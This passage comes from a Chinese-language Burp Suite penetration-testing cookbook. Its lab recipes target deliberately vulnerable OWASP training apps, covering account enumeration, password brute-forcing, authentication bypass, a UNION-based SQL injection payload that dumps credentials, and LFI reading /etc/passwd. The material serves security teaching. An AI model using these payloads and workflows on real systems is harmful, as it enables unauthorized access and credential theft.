# 第四章：评估身份验证方案

在本章中，我们将涵盖以下示例：

+   测试帐户枚举和可猜测的帐户

+   测试弱锁定机制

+   测试绕过身份验证方案

+   测试浏览器缓存弱点

+   通过 REST API 测试帐户配置过程

# 介绍

本章涵盖了对身份验证方案的基本渗透测试。*身份验证*是验证个人或对象声明是否真实的行为。Web 渗透测试人员必须进行关键评估，以确定目标应用程序的身份验证方案的强度。此类测试包括发动攻击，以确定帐户枚举和可猜测的帐户的存在，弱锁定机制的存在，应用程序方案是否可以被绕过，应用程序是否包含浏览器缓存弱点，以及是否可以通过 REST API 调用进行身份验证来配置帐户。您将学习如何使用 Burp 执行此类测试。

# 软件工具要求

要完成本章的示例，您需要以下内容：

+   OWASP Broken Web Applications（VM）

+   OWASP Mutillidae 链接

+   GetBoo 链接

+   Burp 代理社区或专业版（[`portswigger.net/burp/`](https://portswigger.net/burp/)）

+   配置为允许 Burp 代理流量的 Firefox 浏览器（[`www.mozilla.org/en-US/firefox/new/`](https://www.mozilla.org/en-US/firefox/new/)）

# 测试帐户枚举和可猜测的帐户

通过与身份验证机制进行交互，测试人员可能会发现可以收集一组有效的用户名。一旦识别出有效帐户，就可能有可能对密码进行暴力破解。本示例解释了如何使用 Burp Intruder 来收集有效用户名列表。

# 做好准备

针对目标应用程序执行用户名枚举。

# 如何做...

确保 Burp 和 OWASP BWA VM 正在运行，并且 Burp 已在用于查看 OWASP BWA 应用程序的 Firefox 浏览器中进行配置。

1.  从 OWASP BWA 登陆页面，单击 GetBoo 应用程序的链接：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/bpst-cb/img/00135.jpeg)

1.  单击**登录**按钮，在登录屏幕上，尝试使用帐户用户名`admin`和密码`aaaaa`登录：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/bpst-cb/img/00136.jpeg)

1.  注意返回的消息是**密码无效**。根据这个信息，我们知道 admin 是一个有效的帐户。让我们使用 Burp **入侵者**来查找更多帐户。

1.  在 Burp 的**代理**|**HTTP 历史**选项卡中，找到登录失败的消息。查看**响应**|**原始**选项卡，找到相同的过于冗长的错误消息，**密码无效**：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/bpst-cb/img/00137.jpeg)

1.  切换回**请求**|**原始**选项卡，右键单击将此请求发送到**入侵者**：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/bpst-cb/img/00138.jpeg)

1.  转到 Burp 的**入侵者**选项卡，将**入侵者**|**目标**选项卡设置保持不变。继续到**入侵者**|**位置**选项卡。注意 Burp 如何在找到的每个参数值周围放置有效载荷标记。但是，我们只需要在密码值周围放置有效载荷标记。单击**清除**按钮以删除 Burp 放置的有效载荷标记：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/bpst-cb/img/00139.jpeg)

1.  然后，使用光标突出显示 admin 的名称值，并单击**添加§**按钮：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/bpst-cb/img/00140.jpeg)

1.  继续到**入侵者**|**有效载荷**选项卡。许多测试人员使用单词列表来枚举有效载荷标记占位符中常用的用户名。对于这个示例，我们将输入一些常见的用户名，以创建自定义有效载荷列表。

1.  在**有效载荷选项[简单列表]**部分，键入字符串`user`，然后单击**添加**按钮：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/bpst-cb/img/00141.jpeg)

1.  在有效载荷列表框中添加一些字符串，如`john`，`tom`，`demo`，最后是`admin`：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/bpst-cb/img/00142.jpeg)

1.  转到**入侵者**|**选项**选项卡，向下滚动到**Grep - 匹配**部分。单击复选框**标记结果**，**与这些表达式匹配的响应项**。单击**清除**按钮以删除当前列表中的项目：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/bpst-cb/img/00143.jpeg)

1.  单击**是**以确认您希望清除列表。

1.  在文本框中输入字符串`密码无效`，然后单击**Add**按钮。您的**Grep - Match**部分应如下截图所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/bpst-cb/img/00144.jpeg)

1.  单击**Options**页面顶部的**Start attack**按钮。弹出对话框显示定义的有效负载，以及我们在**Grep - Match**部分下添加的新列。这个弹出窗口是攻击结果表。

1.  攻击结果表显示每个请求的给定有效负载导致状态代码为**200**，其中两个有效负载**john**和**tom**在响应中没有产生**密码无效**的消息。相反，这两个有效负载返回了**用户不存在**的消息：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/bpst-cb/img/00145.jpeg)

1.  这次攻击的结果表明，基于过于冗长的错误消息**密码无效**，存在用户名枚举漏洞，这证实了用户帐户存在于系统中：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/bpst-cb/img/00146.jpeg)

这意味着我们能够确认系统中已经存在用户`user`，`demo`和`admin`的帐户。

# 测试弱锁定机制

应用程序应该设置锁定机制以减轻暴力登录攻击。通常，应用程序在三到五次尝试之间设置阈值。许多应用程序在允许重新尝试之前会锁定一段时间。

渗透测试人员必须测试登录保护的所有方面，包括挑战问题和响应（如果存在）。

# 做好准备

确定应用程序是否存在适当的锁定机制。如果不存在，尝试针对登录页面的凭据进行暴力破解，以实现对应用程序的未经授权访问。使用 OWASP Mutillidae II 应用程序，尝试使用有效用户名但无效密码登录五次。

# 如何操作...

确保 Burp 和 OWASP BWA VM 正在运行，并且 Burp 已在用于查看 OWASP BWA 应用程序的 Firefox 浏览器中进行配置。

1.  从 OWASP BWA 登陆页面，单击链接到 OWASP Mutillidae II 应用程序。

1.  打开 Firefox 浏览器，转到 OWASP Mutillidae II 的登录屏幕。从顶部菜单中，单击**登录**。

1.  在登录屏幕上，尝试使用用户名`admin`和错误密码`aaaaaa`登录五次。请注意，在这五次尝试期间，应用程序没有做出任何不同的反应。应用程序没有更改显示的错误消息，管理员帐户也没有被锁定。这意味着登录可能容易受到暴力破解密码猜测攻击的影响：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/bpst-cb/img/00147.jpeg)

让我们继续测试，以暴力破解登录页面并未经授权地访问应用程序。

1.  转到**Proxy** | **HTTP history**选项卡，并查找登录失败的尝试。右键单击五个请求中的一个，并将其发送到**Intruder**：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/bpst-cb/img/00148.jpeg)

1.  转到 Burp 的**Intruder**选项卡，并将**Intruder** | **Target**选项卡设置保持不变。继续到**Intruder** | **Positions**选项卡，并注意 Burp 如何在找到的每个参数值周围放置有效负载标记。但是，我们只需要在密码的值周围放置有效负载标记。单击**Clear §**按钮以删除 Burp 放置的有效负载标记：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/bpst-cb/img/00149.jpeg)

1.  然后，突出显示**aaaaaa**的密码值，然后单击**Add §**按钮。

1.  继续到**Intruder** | **Payloads**选项卡。许多测试人员使用单词列表来暴力破解有效负载标记占位符中常用的密码。对于这个示例，我们将输入一些常用密码来创建我们自己的独特有效负载列表。

1.  在**Payload Options [Simple list]**部分，输入字符串`admin123`，然后单击**Add**按钮：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/bpst-cb/img/00150.jpeg)

1.  在有效负载列表框中添加一些字符串，例如`adminpass`，`welcome1`，最后是`admin`：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/bpst-cb/img/00151.jpeg)

1.  转到**Intruder** | **Options**选项卡，向下滚动到**Grep – Extract**部分：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/bpst-cb/img/00152.jpeg)

1.  点击复选框**Extract the following items from responses**，然后点击**Add**按钮。一个弹出框会显示，显示你使用`admin`/`aaaaaa`请求进行的登录尝试的响应。

1.  在底部的搜索框中搜索`Not Logged In`这几个单词。找到匹配后，你必须正确地突出显示**Not Logged In**这几个单词，以正确地分配 grep 匹配：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/bpst-cb/img/00153.jpeg)

1.  如果你没有正确地突出显示单词，在点击**确定**后，你会在**Grep – Extract**框内看到**[INVALID]**。如果发生这种情况，点击**删除**按钮删除条目，然后再次点击**添加**按钮，执行搜索，突出显示单词。

1.  如果你正确地突出显示了单词，你应该在**Grep – Extract**框中看到以下内容：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/bpst-cb/img/00154.jpeg)

1.  现在，在**Options**页面的右上角点击**Start attack**按钮。

1.  弹出的攻击结果表格会显示请求和你定义的有效负载放置到有效负载标记位置中。注意到产生的攻击表格显示了一个名为**ReflectedXSSExecution**的额外列。这一列是之前设置的**Grep – Extract Option**的结果。

1.  从这个攻击表格中，查看额外的列，测试人员可以轻松地确定哪个请求号成功地暴力破解了登录界面。在这种情况下，**Request 4**，使用用户名`admin`和密码`admin`成功地登录了应用程序：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/bpst-cb/img/00155.jpeg)

1.  在攻击表格中选择**Request 4**，查看**Response** | **Render**选项卡。你应该在右上角看到消息**Logged In Admin: admin (g0t r00t?)**：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/bpst-cb/img/00156.jpeg)

1.  点击攻击表格右上角的**X**关闭攻击表格。

你成功地暴力破解了系统上一个有效账户的密码，因为应用程序的锁定机制较弱。

# 测试绕过身份验证方案

应用程序可能存在缺陷，允许绕过已经存在的身份验证措施进行未经授权的访问。绕过技术包括**直接页面请求**（即强制浏览）、**参数修改**、**会话 ID 预测**和**SQL 注入**。

为了本教程的目的，我们将使用参数修改。

# 准备工作

添加和编辑参数，使未经身份验证的请求与先前捕获的经过身份验证的请求匹配。重放修改后的未经身份验证的请求，以绕过登录机制获取对应用程序的访问权限。

# 操作步骤

1.  打开 Firefox 浏览器，使用顶部菜单左侧的**Home**按钮，打开 OWASP Mutillidae II 的主页。确保你*没有登录*该应用程序。如果你已经登录，从菜单中选择**Logout**：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/bpst-cb/img/00157.jpeg)

1.  在 Burp 中，转到**Proxy** | **HTTP history**选项卡，并选择刚刚进行的未经身份验证的主页浏览请求。右键单击，然后选择**Send to Repeater**：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/bpst-cb/img/00158.jpeg)

1.  使用相同的请求和位置，再次右键单击，然后选择**Send to Comparer**（请求）：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/bpst-cb/img/00159.jpeg)

1.  返回浏览器的主页，然后点击**登录/注册**按钮。在登录页面，使用用户名`admin`和密码`admin`进行登录。点击**登录**。

1.  登录后，继续注销。确保你按下**注销**按钮并从管理员账户注销。

1.  在 Burp 中，转到**Proxy** | **HTTP history**选项卡，并选择刚刚进行的请求，以`admin`身份登录。选择`POST 302`重定向后立即进行的`GET`请求。右键单击，然后选择**Send to** **Repeater**（请求）：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/bpst-cb/img/00160.jpeg)

1.  使用相同的请求和位置，再次右键单击并选择**Send to Comparer**（请求）：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/bpst-cb/img/00161.jpeg)

1.  转到 Burp 的**Comparer**选项卡。注意您发送的两个请求都被突出显示。按下右下角的**Words**按钮，同时比较这两个请求：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/bpst-cb/img/00162.jpeg)

1.  一个对话框弹出显示两个请求，使用颜色编码的高亮显示来吸引您的注意。注意**Referer**标头中的更改以及放置在管理员帐户 cookie 中的附加名称/值对。使用右侧的**X**关闭弹出框：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/bpst-cb/img/00163.jpeg)

1.  返回到**Repeater**，其中包含您作为未经身份验证的用户执行的第一个`GET`请求。在执行此攻击之前，请确保您已完全注销应用程序。

1.  您可以通过单击与您未经身份验证请求相关的**Repeater**中的**Go**按钮来验证您已注销：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/bpst-cb/img/00164.jpeg)

1.  现在切换到**Repeater**选项卡，其中包含您作为经过身份验证的用户`admin`执行的第二个`GET`请求。从经过身份验证的请求中复制**Referer**标头和**Cookie**的值。这是用于绕过身份验证的参数修改攻击：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/bpst-cb/img/00165.jpeg)

1.  从经过身份验证的`GET`请求中复制突出显示的标头（**Referer 和 Cookie**）。您将把这些值粘贴到未经身份验证的`GET`请求中。

1.  通过突出显示并右键单击，然后选择**粘贴**，在未经身份验证的`GET`请求中替换相同的标头。

1.  右键单击并选择**粘贴**在您作为未经身份验证的用户执行的第一个`GET`请求的**Repeater** | **Raw**选项卡中。

1.  单击**Go**按钮发送您修改后的`GET`请求。请记住，这是您作为未经身份验证的用户执行的第一个`GET`请求。

1.  验证您现在在**Response** | **Render**选项卡中以管理员身份登录。我们能够通过执行参数操作绕过身份验证机制（即登录页面）：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/bpst-cb/img/00166.jpeg)

# 工作原理

通过将 cookie 中找到的令牌和经过身份验证的请求的 referer 值重新播放到未经身份验证的请求中，我们能够绕过身份验证方案并未经授权地访问应用程序。

# 测试浏览器缓存的弱点

浏览器缓存可提供改进的性能和更好的最终用户体验。但是，当用户在浏览器中输入敏感数据时，这些数据也可能被缓存在浏览器历史记录中。通过检查浏览器的缓存或简单地按下浏览器的*返回*按钮，可以查看这些缓存数据。

# 准备就绪

使用浏览器的返回按钮，确定登录凭据是否被缓存，从而允许未经授权的访问。在 Burp 中检查这些步骤，以了解漏洞。

# 如何操作...

1.  以`admin`身份使用密码`admin`登录 Mutillidae 应用程序。

1.  现在通过单击顶部菜单中的**注销**按钮注销应用程序。

1.  通过注意**未登录**消息来验证您已注销。

1.  在 Burp 的**Proxy** | **History**中查看这些步骤作为消息。请注意，注销会执行**302**重定向，以防止在浏览器中缓存 cookie 或凭据：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/bpst-cb/img/00167.jpeg)

1.  从 Firefox 浏览器，单击返回按钮，注意即使您没有登录，您现在已经以管理员身份登录！这是因为浏览器中存储的缓存凭据以及应用程序中未设置任何缓存控制保护。

1.  现在在浏览器中刷新/重新加载页面，您会看到您再次被注销。

1.  在**Proxy** | **HTTP history**选项卡中检查这些步骤。通过浏览器执行的步骤与**Proxy** | **HTTP history**表中捕获的消息进行对比：

+   以下截图中的请求 1 是未经身份验证的

+   请求 35 是成功登录（302）为`admin`

+   请求 37 是`admin`帐户的注销

+   请求 38 和 39 是刷新或重新加载浏览器页面，再次将我们注销

1.  当您按浏览器的返回按钮时，不会捕获任何请求。这是因为返回按钮操作包含在浏览器中。没有通过 Burp 发送消息到 Web 服务器执行此操作。这是一个重要的区别需要注意。尽管如此，我们发现了与弱浏览器缓存保护相关的漏洞。在这种情况下，渗透测试人员将拍摄已登录缓存页面的截图，然后点击返回按钮后看到：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/bpst-cb/img/00168.jpeg)

# 通过 REST API 测试帐户配置过程

帐户配置是在应用程序中建立和维护用户帐户的过程。配置功能通常仅限于管理员帐户。渗透测试人员必须验证用户提供适当的身份识别和授权来完成帐户配置功能。帐户配置的常见方式是通过**表述性状态转移**（**REST**）API 调用。许多时候，开发人员可能不会为应用程序的 UI 部分使用的 API 调用设置相同的授权检查。

# 准备工作

使用 OWASP Mutillidae II 应用程序中提供的 REST API 调用，确定未经身份验证的 API 调用是否可以配置或修改用户。

# 如何做…

确保您没有登录到应用程序中。如果登录了，请从顶部菜单中单击**Logout**按钮。

1.  在 Mutillidae 中，浏览到**User Lookup (SQL) Page**，然后选择**OWASP 2013** | **A1 Injection (SQL)** | **SQLi – Extract Data** | **User Info (SQL)**：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/bpst-cb/img/00169.jpeg)

1.  在**Name**中键入`user`，在**Password**中键入`user`，然后单击**View Account Details**。您应该看到下一个截图中显示的结果。这是我们将使用 REST 调用测试配置功能的帐户：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/bpst-cb/img/00170.jpeg)

通过 Spidering，Burp 可以找到`/api`或`/rest`文件夹。这些文件夹是应用程序启用 REST API 的线索。测试人员需要确定通过这些 API 调用可以使用哪些功能。

1.  对于 Mutillidae，`/webservices/rest/`文件夹结构通过 REST API 调用提供帐户配置。

1.  要直接转到 Mutillidae 中的此结构，选择**Web Services** | **REST** | **SQL Injection** | **User** **Account Management**：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/bpst-cb/img/00171.jpeg)

您将看到一个屏幕，描述了支持的 REST 调用以及每个调用所需的参数：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/bpst-cb/img/00172.jpeg)

1.  让我们尝试调用其中一个 REST 调用。转到**Proxy** | **HTTP history**表，并选择您从菜单中发送的最新请求，以进入**User Account Management**页面。右键单击并将此请求发送到**Repeater**：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/bpst-cb/img/00173.jpeg)

1.  在 Burp 的**Repeater**中，将`?`添加到 URL 后面，然后加上参数名/值对`username=user`。新的 URL 应该如下所示：

```
/mutillidae/webservices/rest/ws-user-account.php?username=user
```

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/bpst-cb/img/00174.jpeg)

1.  单击**Go**按钮，注意我们能够以未经身份验证的用户身份检索数据！执行此类操作无需身份验证令牌：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/bpst-cb/img/00175.jpeg)

1.  让我们看看还能做什么。使用**User Account Management**页面上给出的 SQL 注入字符串，让我们尝试转储整个用户表。

1.  在`username=`后附加以下值：

```
user'+union+select+concat('The+password+for+',username,'+is+',+password),mysignature+from+accounts+--+
```

新的 URL 应该是以下一个：

```
/mutillidae/webservices/rest/ws-user-account.php?username=user'+union+select+concat('The+password+for+',username,'+is+',+password),mysignature+from+accounts+--+
```

1.  在更改`username`参数后，单击**Go**按钮。您的请求应如下所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/bpst-cb/img/00176.jpeg)

1.  请注意，我们已经转储了数据库中的所有帐户，显示了所有用户名、密码和签名：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/bpst-cb/img/00177.jpeg)

1.  掌握了这些信息后，返回到**Proxy** | **HTTP History**，选择您发送到**User** **Account Management**页面的请求，右键单击，并发送到**Repeater**。

1.  在**Repeater**中，修改`GET`动词，并在**Request**的**Raw**选项卡中用`DELETE`替换它：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/bpst-cb/img/00178.jpeg)

1.  转到**Params**选项卡，点击**添加**按钮，然后添加两个`Body`类型参数：首先，用户名设置为`user`，其次，密码设置为`user`，然后点击**Go**按钮：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/bpst-cb/img/00179.jpeg)

1.  请注意，我们已经删除了该账户！我们能够检索信息，甚至在不显示 API 密钥或身份验证令牌的情况下修改（删除）数据库中的行！

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/bpst-cb/img/00180.jpeg)

注意：如果您希望重新创建用户账户，请重复上述步骤，将*delete*替换为*put*。签名是可选的。点击**Go**按钮。用户账户将被重新创建。


# 第五章：评估授权检查

在本章中，我们将介绍以下配方：

+   测试目录遍历

+   测试**本地文件包含**（**LFI**）

+   测试**远程文件包含**（**RFI**）

+   测试特权升级

+   测试不安全的直接对象引用

# 介绍

本章介绍了授权的基础知识，包括应用程序如何使用角色来确定用户功能的解释。Web 渗透测试涉及关键评估，以确定应用程序验证分配给特定角色的功能的程度，我们将学习如何使用 Burp 执行这些测试。

# 软件要求

要完成本章中的配方，您将需要以下内容：

+   OWASP 破损的 Web 应用程序（VM）

+   OWASP mutillidae 链接

+   Burp Proxy Community 或 Professional（[`portswigger.net/burp/`](https://portswigger.net/burp/)）

+   Firefox 浏览器配置为允许 Burp 代理流量（[`www.mozilla.org/en-US/firefox/new/`](https://www.mozilla.org/en-US/firefox/new/)）

+   来自 GitHub 的`wfuzz`字典存储库（[`github.com/xmendez/wfuzz`](https://github.com/xmendez/wfuzz)）

# 测试目录遍历

目录遍历攻击是试图发现或强制浏览未经授权的网页，通常为应用程序的管理员设计。如果应用程序未正确配置 Web 文档根目录，并且未包括对访问的每个页面进行适当授权检查，则可能存在目录遍历漏洞。在特定情况下，这种弱点可能导致系统命令注入攻击或攻击者执行任意代码的能力。

# 准备就绪

使用 OWASP Mutillidae II 作为我们的目标应用程序，让我们确定它是否包含任何目录遍历漏洞。

# 如何做...

确保 Burp 和 OWASP BWA VM 正在运行，并且 Burp 已在用于查看 OWASP BWA 应用程序的 Firefox 浏览器中进行配置。

1.  从 OWASP BWA 登陆页面，单击链接到 OWASP Mutillidae II 应用程序。

1.  在 OWASP Mutillidae II 的登录屏幕上打开 Firefox 浏览器。从顶部菜单中，单击**登录**。

1.  找到刚刚在**Proxy** | **HTTP history**表中执行的请求。查找对`login.php`页面的调用。突出显示消息，将光标移动到**Request**选项卡的**Raw**选项卡中，右键单击，然后单击**Send to Intruder**：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/bpst-cb/img/00181.jpeg)

1.  切换到**Intruder** | **Positions**选项卡，并单击右侧的**Clear $**按钮清除所有 Burp 定义的有效负载标记。

1.  突出显示存储在`page`参数（`login.php`）中的值，并使用**Add §**按钮在其周围放置一个有效负载标记：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/bpst-cb/img/00182.jpeg)

1.  继续到**Intruder** | **Payloads**选项卡，并从`wfuzz`存储库中选择以下字典：`admin-panels.txt`。从 GitHub 存储库中的位置遵循此文件夹结构：`wfuzz`/`wordlist`/`general`/`admin-panels.txt`。

1.  在**Intruder** | **Payloads**选项卡的**Payload Options [Simple list]**部分中单击**Load**按钮，将弹出一个窗口，提示您选择您的字典的位置。

1.  浏览到您从 GitHub 下载了`wfuzz`存储库的位置。继续搜索`wfuzz`文件夹结构（`wfuzz`/`wordlist`/`general`/），直到找到`admin-panels.txt`文件，然后通过单击**打开**选择文件：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/bpst-cb/img/00183.jpeg)

1.  滚动到底部，取消选中（默认情况下，它已选中）**URL 编码这些字符**选项：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/bpst-cb/img/00184.jpeg)

1.  现在您已经准备好开始攻击。单击**Intruder** | **Positions**页面右上角的**Start attack**按钮：

攻击结果表将出现。允许攻击完成。`admin-panels.txt`字典中有 137 个有效负载。按照**Length**列从升序到降序排序，以查看哪些有效负载命中了网页。

1.  注意响应长度较大的有效负载。看起来很有希望！也许我们已经偶然发现了一些可能包含指纹信息或未经授权访问的管理页面：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/bpst-cb/img/00185.jpeg)

1.  选择长度最大的列表中的第一个页面**administrator.php**。从攻击结果表中，查看**Response** | **Render**选项卡，并注意页面显示了 PHP 版本和系统信息：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/bpst-cb/img/00186.jpeg)

# 工作原理...

甚至在未登录的情况下，我们就能够强制浏览到 Web 应用程序中未映射的区域。术语*未映射*意味着应用程序本身没有直接链接到这个秘密配置页面。但是，使用 Burp Intruder 和包含常见已知管理文件名的字典，我们能够使用目录遍历攻击发现该页面。

# 测试本地文件包含（LFI）

Web 服务器通过配置设置控制对特权文件和资源的访问。特权文件包括只能由系统管理员访问的文件。例如，在类 UNIX 平台上是`/etc/passwd`文件，或者在 Windows 系统上是`boot.ini`文件。

**LFI**攻击是试图使用目录遍历攻击访问特权文件的尝试。LFI 攻击包括不同的样式，包括**点点斜杠攻击**（**../**），**目录暴力破解**，**目录攀升**或**回溯**。

# 准备工作

使用 OWASP Mutillidae II 作为我们的目标应用程序，让我们确定它是否包含任何 LFI 漏洞。

# 如何操作...

确保 Burp 和 OWASP BWA VM 正在运行，并且 Burp 已配置在用于查看 OWASP BWA 应用程序的 Firefox 浏览器中。

1.  从 OWASP BWA 登陆页面，点击链接到 OWASP Mutillidae II 应用程序。

1.  打开 Firefox 浏览器，转到 OWASP Mutillidae II 的登录界面。从顶部菜单，点击**Login**。

1.  在**Proxy** | **HTTP history**表中找到您刚刚执行的请求。查找对`login.php`页面的调用。突出显示消息，将光标移动到**Request**选项卡的**Raw**选项卡中，右键单击，然后**Send to Intruder**。

1.  切换到**Intruder** | **Positions**选项卡，并点击右侧的**Clear §**按钮清除所有 Burp 定义的有效负载标记。

1.  突出显示当前存储在`page`参数（`login.php`）中的值，并使用右侧的**Add  §**按钮在其周围放置有效负载标记。

1.  继续到**Intruder** | **Payloads**选项卡。从`wfuzz`存储库中选择以下字典：`Traversal.txt`**. **从 GitHub 存储库中的文件夹结构如下：`wfuzz`/`wordlist`/`injections`/`Traversal.txt`。

1.  点击**Intruder** | **Payloads**选项卡中**Payload Options [Simple list]**部分的**Load**按钮。将显示一个弹出窗口，提示您输入字典的位置。

1.  浏览到您从 GitHub 下载`wfuzz`存储库的位置。继续搜索`wfuzz`文件夹结构，直到找到`admin-panels.txt`文件。选择文件，然后点击**Open**：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/bpst-cb/img/00187.jpeg)

1.  滚动到底部，取消选中（默认情况下是选中的）**URL-encode these characters**选项。

1.  您现在已经准备好开始攻击。点击**Intruder** | **Positions**页面右上角的**Start attack**按钮。

1.  攻击结果表将出现。允许攻击完成。按照**Length**列从升序到降序排序，以查看哪些有效负载命中了网页。注意长度较大的有效负载；也许我们已经未经授权地访问了系统配置文件！

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/bpst-cb/img/00188.jpeg)

1.  在列表中选择请求＃2。从攻击结果表中，查看**响应** | **渲染**选项卡，并注意页面显示了系统中的主机文件！

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/bpst-cb/img/00189.jpeg)

1.  继续向下滚动攻击结果表中的请求列表。查看请求＃6，然后查看**响应** | **渲染**选项卡，并注意页面显示了系统中的`/etc/passwd`文件！

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/bpst-cb/img/00190.jpeg)

# 它是如何工作的...

由于文件权限受到不良保护和应用程序授权检查不足，攻击者能够读取系统中包含敏感信息的特权本地文件。

# 测试远程文件包含（RFI）

**远程文件包含**（**RFI**）是一种试图访问外部 URL 和远程文件的攻击。由于参数操纵和缺乏服务器端检查，攻击是可能的。这些疏忽允许参数更改将用户重定向到未列入白名单或未经适当数据验证的位置。

# 做好准备

使用 OWASP Mutillidae II 作为我们的目标应用程序，让我们确定它是否包含任何 RFI 漏洞。

# 如何做...

确保 Burp 和 OWASP BWA VM 正在运行，并且已在用于查看 OWASP BWA 应用程序的 Firefox 浏览器中配置了 Burp。

1.  从 OWASP BWA 登陆页面，点击链接到 OWASP Mutillidae II 应用程序。

1.  打开 Firefox 浏览器，转到 OWASP Mutillidae II 的登录界面。从顶部菜单中，点击**登录**。

1.  在**代理** | **HTTP 历史**表中找到您刚刚执行的请求。寻找对`login.php`页面的调用：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/bpst-cb/img/00191.jpeg)

1.  记下确定要加载的页面的`page`参数：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/bpst-cb/img/00192.jpeg)

让我们看看是否可以通过提供应用程序外部的 URL 来利用此参数。出于演示目的，我们将在 OWASP BWA VM 中使用我们控制的 URL。但是，在野外，这个 URL 将由攻击者控制。

1.  切换到**代理** | **拦截**选项卡，并按下**拦截已打开**按钮。

1.  返回到 Firefox 浏览器，并重新加载登录页面。请求被暂停，并包含在**代理** | **拦截**选项卡中：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/bpst-cb/img/00193.jpeg)

1.  现在让我们将`login.php`的`page`参数值操纵为应用程序外部的 URL。让我们使用登录页面到**GetBoo**应用程序。您的 URL 将特定于您机器的 IP 地址，因此请相应调整。新的 URL 将是`http://<your_IP_address>/getboo/`

1.  将`login.php`的值替换为`http://<your_IP_address>/getboo/`，然后点击**Forward**按钮：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/bpst-cb/img/00194.jpeg)

1.  现在再次按下**拦截已打开**按钮，以切换拦截按钮为**关闭（拦截已关闭）**。

1.  返回到 Firefox 浏览器，并注意加载的页面是 Mutillidae 应用程序上的**GetBoo**索引页面！

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/bpst-cb/img/00195.jpeg)

# 它是如何工作的...

`page`参数没有包括适当的数据验证，以确保提供给它的值被列入白名单或包含在可接受值的规定列表中。通过利用这种弱点，我们能够指定这个参数的值，这是不应该被允许的。

# 测试特权升级

应用程序中的开发人员代码必须包括对分配角色的授权检查，以确保授权用户无法将其角色提升到更高的特权。这种特权升级攻击是通过修改分配角色的值并用另一个值替换来发生的。如果攻击成功，用户将未经授权地访问通常限制为管理员或更强大帐户的资源或功能。

# 做好准备

使用 OWASP Mutillidae II 作为我们的目标应用程序，让我们以普通用户 John 的身份登录，并确定我们是否可以将我们的角色提升为管理员。

# 如何做...

确保 Burp 和 OWASP BWA VM 正在运行，并且已在用于查看 OWASP BWA 应用程序的 Firefox 浏览器中配置了 Burp。

1.  从 OWASP BWA 登陆页面，点击链接到 OWASP Mutillidae II 应用程序。

1.  打开 Firefox 浏览器到 OWASP Mutillidae II 的登录界面。从顶部菜单中，点击**登录**。

1.  在登录界面，使用以下凭据登录—用户名：`john`和密码：`monkey`。

1.  切换到 Burp 的**代理** | **HTTP 历史**选项卡。通过以`john`登录，找到您刚刚进行的`POST`和随后的`GET`请求：

